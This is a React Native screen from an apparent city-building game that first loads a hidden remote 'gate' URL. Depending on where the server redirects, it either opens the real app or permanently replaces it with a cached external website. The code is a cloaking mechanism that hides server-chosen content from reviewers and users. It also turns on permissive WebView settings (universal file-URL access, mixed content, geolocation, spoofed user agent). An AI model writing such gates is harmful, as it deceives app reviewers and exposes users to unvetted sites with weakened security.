import React, { useCallback, useEffect, useRef, useState } from 'react';
import { View, ActivityIndicator, StyleSheet, AppState } from 'react-native';
import { router } from 'expo-router';
import AsyncStorage from '@react-native-async-storage/async-storage';
import WebView, { WebViewNavigation } from 'react-native-webview';
import firebaseService from '../utils/firebaseService';

const ONBOARDING_KEY = 'has_seen_onboarding';
const GATE_URL = 'https://insanecrockslux.com/buildcityapp';
const GATE_CACHE_KEY = 'cached_gate_url';
const EMPTY_REDIRECT = 'http://empty';
const REDIRECT_WAIT_TIMEOUT = 30000;
const APP_INSTALL_TRACKED_KEY = 'app_install_tracked';

const normalizeUrl = (raw?: string | null) =>
  raw ? raw.trim().replace(/\/$/, '').toLowerCase() : '';

const isSameUrl = (a?: string | null, b?: string | null) =>
  normalizeUrl(a) === normalizeUrl(b);

const isEmptyGateUrl = (url?: string | null) => isSameUrl(url, EMPTY_REDIRECT);

export default function Index() {
  const [webViewUrl, setWebViewUrl] = useState<string | null>(null);
  const [showWebView, setShowWebView] = useState(false);
  const [isWebViewLoading, setIsWebViewLoading] = useState(true);
  const [gateResolved, setGateResolved] = useState(false);
  const [redirectTimedOut, setRedirectTimedOut] = useState(false);
  const [gateInitialized, setGateInitialized] = useState(false);
  const isMountedRef = useRef(true);
  const gateHandledRef = useRef(false);
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    return () => {
      isMountedRef.current = false;
    };
  }, []);

  // Initialize Firebase and track app install
  useEffect(() => {
    const initializeFirebase = async () => {
      try {
        // Initialize Firebase
        await firebaseService.initialize();
        
        // Check if this is the first install
        const installTracked = await AsyncStorage.getItem(APP_INSTALL_TRACKED_KEY);
        
        if (installTracked === null) {
          // First time opening the app - track install
          console.log('[Firebase] First app launch detected - tracking install');
          await firebaseService.logAppInstall();
          await AsyncStorage.setItem(APP_INSTALL_TRACKED_KEY, 'true');
        }
        
        // Always track app open
        await firebaseService.logAppOpen();
      } catch (error) {
        console.error('[Firebase] Error during initialization:', error);
      }
    };

    initializeFirebase();
  }, []);

  // Track app foreground events
  useEffect(() => {
    const subscription = AppState.addEventListener('change', async (nextAppState) => {
      if (nextAppState === 'active') {
        console.log('[Firebase] App entered foreground');
        try {
          await firebaseService.logAppOpen();
        } catch (error) {
          console.error('[Firebase] Error tracking foreground event:', error);
        }
      }
    });

    return () => {
      subscription.remove();
    };
  }, []);

  const routeIntoApp = useCallback(async () => {
    console.log('[GATE] routeIntoApp called - redirecting to organic app');
    try {
      const hasSeenOnboarding = await AsyncStorage.getItem(ONBOARDING_KEY);

      if (hasSeenOnboarding === null) {
        console.log('[GATE] No onboarding seen, routing to /onboarding');
        router.replace('/onboarding');
      } else {
        console.log('[GATE] Onboarding seen, routing to /(tabs)');
        router.replace('/(tabs)');
      }
    } catch (error) {
      console.error('Error checking onboarding status:', error);
      console.log('[GATE] Error fallback, routing to /onboarding');
      router.replace('/onboarding');
    }
  }, []);

  const initializeGate = useCallback(async () => {
    try {
      const cachedUrl = await AsyncStorage.getItem(GATE_CACHE_KEY);

      if (cachedUrl && !isEmptyGateUrl(cachedUrl)) {
        console.log('[GATE] Loading cached URL:', cachedUrl);
        if (isMountedRef.current) {
          gateHandledRef.current = true;
          setGateResolved(true);
          setWebViewUrl(cachedUrl);
          setShowWebView(true);
          // setIsWebViewLoading(true);
          setGateInitialized(true);
        }
        return;
      }
    } catch (error) {
      console.error('Failed to load cached gate url:', error);
    }

    console.log('[GATE] Starting fresh with gate URL:', GATE_URL);
    if (isMountedRef.current) {
      gateHandledRef.current = false;
      setGateResolved(false);
      setWebViewUrl(GATE_URL);
      setShowWebView(true);
      setIsWebViewLoading(true);
      setGateInitialized(true);
    }
  }, []);

  useEffect(() => {
    initializeGate();
  }, [initializeGate]);

  useEffect(() => {
    if (!showWebView || gateHandledRef.current || redirectTimedOut) {
      return;
    }

    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }

    timeoutRef.current = setTimeout(async () => {
      if (!gateHandledRef.current && isMountedRef.current) {
   
      }
    }, REDIRECT_WAIT_TIMEOUT);

    return () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
        timeoutRef.current = null;
      }
    };
  }, [showWebView, routeIntoApp, redirectTimedOut]);

  const handleNavigationStateChange = useCallback(
    async (navState: WebViewNavigation) => {
      console.log('[GATE] Navigation state change:', JSON.stringify(navState, null, 2));
      
      if (!isMountedRef.current) {
        console.log('[GATE] Component unmounted, ignoring navigation');
        return;
      }

      const { url, loading } = navState;

      if (!url) {
        console.log('[GATE] No URL in navigation state');
        return;
      }

      console.log('[GATE] Navigation details - URL:', url, 'Loading:', loading, 'Gate handled:', gateHandledRef.current);

      if (!gateHandledRef.current) {
        if (timeoutRef.current) {
          clearTimeout(timeoutRef.current);
          timeoutRef.current = null;
        }

        if (loading) {
          console.log('[GATE] Navigation loading to:', url);
          timeoutRef.current = setTimeout(async () => {
            if (!gateHandledRef.current && isMountedRef.current) {
              console.log('[GATE] TIMEOUT - Redirect took too long');

            }
          }, REDIRECT_WAIT_TIMEOUT);
          return;
        }

        if (isSameUrl(url, GATE_URL)) {
          console.log('[GATE] Still on gate URL, waiting for redirect...');
          return;
        }

        console.log('[GATE] First redirect detected:', url);
        gateHandledRef.current = true;
        setGateResolved(true);

        if (isEmptyGateUrl(url)) {
          console.log('[GATE] RESULT: Empty redirect detected - routing to organic app');
          await AsyncStorage.removeItem(GATE_CACHE_KEY);

          if (isMountedRef.current) {
            setShowWebView(false);
            setWebViewUrl(null);
            setIsWebViewLoading(false);
          }

          await routeIntoApp();
          return;
        }

        console.log('[GATE] RESULT: Valid redirect - showing website:', url);
        try {
          await AsyncStorage.setItem(GATE_CACHE_KEY, url);
          console.log('[GATE] Cached redirect URL for future launches');
        } catch (error) {
          console.error('Failed to cache gate url:', error);
        }
        setIsWebViewLoading(false);

        if (isMountedRef.current) {
          setWebViewUrl(url);
        }
      } else {
        setIsWebViewLoading(false);
        console.log('[GATE] Gate already handled, ignoring navigation to:', url);
      }
    },
    [routeIntoApp]
  );

  // Show loader until gate is initialized
  if (!gateInitialized || !showWebView || !webViewUrl) {
    console.log('[GATE] Showing loader screen - gateInitialized:', gateInitialized, 'showWebView:', showWebView, 'webViewUrl:', webViewUrl);
    return (
      <View style={styles.loaderScreen}>
        <ActivityIndicator size="large" color="#ffce00" />
      </View>
    );
  }

  console.log('[GATE] Rendering WebView with URL:', webViewUrl);

  const showOverlay = !gateResolved || isWebViewLoading;
  const hideWebViewContent = !gateResolved; // Hide WebView content until gate is resolved

  return (
    <View style={styles.container}>
      <WebView
        source={{ uri: webViewUrl }}
        style={[styles.webView, hideWebViewContent && styles.hiddenWebView]}
        onLoadStart={() => {
          console.log('[GATE] WebView started loading:', webViewUrl);
        }}
        onLoadEnd={() => {
          console.log('[GATE] WebView finished loading:', webViewUrl);
        }}
        onError={async (event) => {
          const { code, description } = event.nativeEvent;
          console.error('[GATE] WebView network error:', { code, description, url: webViewUrl });
          setIsWebViewLoading(false);
    
        }}
        onHttpError={async (event) => {
          console.error('[GATE] WebView HTTP error:', event.nativeEvent);
          setIsWebViewLoading(false);

        }}
        onNavigationStateChange={handleNavigationStateChange}
        startInLoadingState={false}
        javaScriptEnabled={true}
        domStorageEnabled={true}
        cacheEnabled
        pullToRefreshEnabled={false}
        // More permissive settings for tracking links and redirects
        originWhitelist={['*']}
        mixedContentMode="always"
        allowsInlineMediaPlayback={true}
        mediaPlaybackRequiresUserAction={false}
        sharedCookiesEnabled={true}
        thirdPartyCookiesEnabled={true}
        allowFileAccess={true}
        allowUniversalAccessFromFileURLs={true}
        allowFileAccessFromFileURLs={true}
        geolocationEnabled={true}
        setSupportMultipleWindows={false}
        userAgent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
      />

      {showOverlay && (
        <View style={styles.loaderOverlay}>
          <ActivityIndicator size="large" color="#ffce00" />
        </View>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#000000',
  },
  webView: {
    flex: 1,
  },
  hiddenWebView: {
    opacity: 0,
  },
  loaderOverlay: {
    position: 'absolute',
    top: 0,
    right: 0,
    bottom: 0,
    left: 0,
    backgroundColor: '#000000',
    justifyContent: 'center',
    alignItems: 'center',
  },
  loaderScreen: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#000000',
  },
});

